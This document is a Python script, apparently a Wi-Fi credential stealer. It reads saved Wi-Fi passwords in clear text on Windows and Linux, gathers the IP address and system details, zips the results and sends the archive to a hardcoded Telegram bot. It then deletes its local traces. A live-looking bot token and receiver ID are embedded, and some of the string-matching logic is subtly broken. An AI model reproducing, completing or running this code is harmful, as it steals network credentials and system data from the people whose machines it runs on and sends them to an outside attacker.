import subprocess
import socket
import zipfile
import platform
import telebot
import os


def get_os():
    return platform.system().lower()


def get_wifi_passwords_windows():
    command = "netsh wlan show profiles"
    result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding='cp866')
    profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if
                ("Все профили пользователей" or "All User Profile") in line]
    wifi_passwords = {}
    for profile in profiles:
        command = f'netsh wlan show profile name="{profile}" key=clear'
        result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding='cp866')
        password_lines = [line.split(":")[1].strip() for line in result.stdout.splitlines() if
                          ("Содержимое ключа" or "Key Content") in line]
        if password_lines:
            wifi_passwords[profile] = password_lines[0]
        else:
            wifi_passwords[profile] = None
    return wifi_passwords


def get_wifi_passwords_linux():
    command = "nmcli -s -f ssid,psk dev wifi list"
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    wifi_passwords = {}
    for line in result.stdout.splitlines():
        if line:
            ssid, psk = line.split(":")
            wifi_passwords[ssid.strip()] = psk.strip()
    return wifi_passwords


def get_wifi_passwords():
    os_name = get_os()
    if os_name == "windows":
        return get_wifi_passwords_windows()
    elif os_name == "linux":
        return get_wifi_passwords_linux()
    else:
        return "Unsupported operating system"


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address


def get_system_info_windows():
    info = {}
    try:
        info['hostname'] = platform.node()
        info['os'] = platform.platform()
        info['cpu'] = platform.processor()
        command = "wmic computersystem get TotalPhysicalMemory /value"
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        total_memory_bytes = int(result.stdout.split("=")[1].strip())
        info['ram'] = f"{total_memory_bytes / (1024 ** 3):.2f} GB"
    except Exception:
        pass
    return info


def get_system_info_linux():
    info = {}
    try:
        info['hostname'] = platform.node()
        info['os'] = platform.platform()
        with open('/proc/cpuinfo', 'r') as f:
            for line in f:
                if line.startswith('model name'):
                    info['cpu'] = line.split(':')[1].strip()
                    break
        with open('/proc/meminfo', 'r') as f:
            for line in f:
                if line.startswith('MemTotal:'):
                    total_memory_kb = int(line.split(':')[1].strip().split()[0])
                    info['ram'] = f"{total_memory_kb / (1024 ** 2):.2f} GB"
                    break
    except Exception:
        pass
    return info


def get_system_info():
    os_name = get_os()
    if os_name == "windows":
        return get_system_info_windows()
    elif os_name == "linux":
        return get_system_info_linux()
    else:
        return "Unsupported operating system"


def write_to_file(filename, data):
    with open(filename, "w", encoding="utf-8") as f:
        f.write(data)


def create_archive(files, archive_name):
    with zipfile.ZipFile(archive_name, "w") as zip_file:
        for file in files:
            zip_file.write(file)


def send_message(archive_path, bot_token, receiver_id):
    bot = telebot.TeleBot(bot_token)
    with open(archive_path, "rb") as f:
        bot.send_document(receiver_id, f)


def remove_files():
    os.remove("ip_address.txt")
    os.remove("wifi_profiles.txt")
    os.remove("system_info.txt")
    os.remove(archive_name)


# main
ip_address = get_ip_address()
wifi_passwords = get_wifi_passwords()
system_info = get_system_info()


archive_name = f"info[{ip_address}].zip"
bot_token = "7166969953:AAElPrJm7lLOlWjB1xQ3M50GJ_VhcOR0kJ0"
receiver_id = "6305649880"


write_to_file("ip_address.txt", ip_address)
with open("wifi_profiles.txt", "w", encoding="utf-8") as f:
    for profile, password in wifi_passwords.items():
        f.write(f"Profile: {profile}, Password: {password}\n")

with open("system_info.txt", "w") as f:
    for key, value in system_info.items():
        f.write(f"{key}: {value}\n")


create_archive(["wifi_profiles.txt", "system_info.txt"], archive_name)
send_message(archive_name, bot_token, receiver_id)
remove_files()




